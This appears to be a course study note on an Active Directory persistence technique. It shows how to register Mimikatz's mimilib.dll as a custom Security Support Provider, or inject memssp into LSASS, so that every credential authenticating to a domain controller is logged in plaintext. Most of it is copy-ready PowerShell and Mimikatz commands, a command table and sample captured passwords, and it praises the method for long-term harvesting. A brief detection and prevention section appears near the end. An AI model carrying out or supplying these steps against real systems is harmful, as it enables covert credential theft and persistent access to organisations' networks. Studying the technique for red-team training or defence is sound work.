# Persistence — Custom SSP (Security Support Provider)

**Date:** 4 August 2026


---

## What is SSP?

**SSP = Security Support Provider**

A DLL that provides authentication methods for applications.

**Microsoft SSP Packages:**
- NTLM — Windows legacy authentication
- Kerberos — Windows primary authentication
- Wdigest — Digest authentication
- CredSSP — Credential Security Support Provider

---

## Custom SSP: mimilib.dll

**Mimikatz provides:** mimilib.dll (custom Security Support Provider)

**What it does:**
- Logs all local logons in plaintext
- Captures service account passwords
- Captures machine account passwords
- Writes to: `C:\Windows\System32\mimilsa.log`

**Result:** Every credential that authenticates to DC is logged in cleartext.

---

## Why Custom SSP is Effective

✅ **Persistent** — survives reboots (registry-based)  
✅ **Silent** — no process execution, integrated into auth  
✅ **Logs everything** — service accounts, users, machines  
✅ **Plaintext credentials** — immediately usable  
✅ **Long-term access** — indefinite credential harvesting  

---

## Method 1: Drop DLL + Registry Modification

**Step 1: Copy mimilib.dll to System32**

```powershell
Copy-Item C:\AD\Tools\mimilib.dll C:\Windows\System32\
```

Place mimilib.dll in System32 folder.

---

**Step 2: Get Current Security Packages**

```powershell
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'
```

Retrieve list of registered SSP packages.

---

**Step 3: Add mimilib to Packages**

```powershell
$packages += "mimilib"
```

Append mimilib to the list.

---

**Step 4: Update Registry (Both Locations)**

```powershell
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages

Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
```

Register mimilib in:
- `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages`
- `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`

---

**Step 5: Reboot (Or log in to trigger loading)**

Mimilib loads on next logon event. Credentials logged to `C:\Windows\System32\mimilsa.log`.

---

## Method 2: Inject via Mimikatz (Live Injection)

**Direct LSASS injection:**

```powershell
SafetyKatz.exe -Command '"misc::memssp"'
```

**Characteristics:**
- Injects into LSASS memory immediately
- No reboot required
- No registry modification
- Logging starts immediately
- Not stable on Server 2019+ (but still usable)

---

## Credential Harvesting

**Harvested credentials logged to:**

```
C:\Windows\System32\mimilsa.log
```

**Log format:**

```
[timestamp] Username Domain Computer
[timestamp] Password/Hash
```

**Example output:**

```
12/05/2022 10:30:15 Administrator DOLLARCORP DCORP-DC
P@ssw0rd!

12/05/2022 10:31:42 svc_admin DOLLARCORP DCORP-DC
ServiceAccountPassword123
```

---

## Complete Attack Flow

```
1. Drop mimilib.dll to C:\Windows\System32\
   ↓
2. Get current SSP packages from registry
   ↓
3. Add "mimilib" to Security Packages list
   ↓
4. Update both registry locations:
   - HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\
   - HKLM\SYSTEM\CurrentControlSet\Control\Lsa\
   ↓
5. Reboot OR wait for next logon
   ↓
6. mimilib.dll loads automatically
   ↓
7. All credentials logged to mimilsa.log
```

---

## Method Comparison

| Aspect | Registry Method | Memory Injection |
|---|---|---|
| Persistence | Yes (survives reboot) | No (until reboot) |
| Stability | Stable | Unstable (2019+) |
| Reboot required | Yes | No |
| Detection risk | Medium (registry change) | Low (memory-only) |
| Reversibility | Requires registry cleanup | Automatic on reboot |

---

## Why Custom SSP is Dangerous

❌ **Passive harvesting** — all credentials captured automatically  
❌ **Persistent** — survives reboots (registry method)  
❌ **Plaintext logging** — no hashes, just passwords  
❌ **Service accounts** — machine account passwords captured  
❌ **Silent** — no user-visible change or notification  

---

## Detection & Prevention

**Detection:**
- Monitor `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` registry
- Look for unknown DLLs (mimilib.dll)
- Check `C:\Windows\System32\mimilsa.log` for suspicious content
- Monitor LSASS process for injection (memory method)
- Alert on DLL registration in Lsa folder

**Prevention:**
- Disable unnecessary SSP packages
- Restrict registry write access to LSA
- Monitor file creation in System32
- Use AppLocker to block unsigned DLLs
- Regular security audits of DC

---

## Command Reference

| Task | Command |
|---|---|
| Get SSP packages | `Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'` |
| Copy mimilib | `Copy-Item C:\AD\Tools\mimilib.dll C:\Windows\System32\` |
| Add to registry | `Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages` |
| Inject via Mimikatz | `SafetyKatz.exe -Command '"misc::memssp"'` |
| View harvested creds | `type C:\Windows\System32\mimilsa.log` |

---

## Persistence Techniques Comparison

| Technique | Type | Duration | Noise |
|---|---|---|---|
| Custom SSP | Credential harvesting | Indefinite | Medium |
| Golden Ticket | Forged TGT | 10+ hours | Medium |
| DSRM | Local backdoor | Indefinite | Medium |
| Skeleton Key | LSASS patch | Until reboot | Very high |
| ACL backdoor | Permission abuse | Indefinite | Low |

---

## Key Takeaway

```
Custom SSP = Passive credential harvester
Drop mimilib.dll + register in Lsa
All credentials logged to plaintext file
Survives reboots (registry method)
Perfect for long-term harvesting
```

---

## References

- [Mimikatz - mimilib.dll](https://github.com/gentilkiwi/mimikatz)
- [SafetyKatz](https://github.com/GhostPack/SafetyKatz)
- [Security Support Provider (Microsoft)](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/security-support-provider-interface-architecture)

---

*Next: Learning Objective 11 — Cross-Forest Attacks*
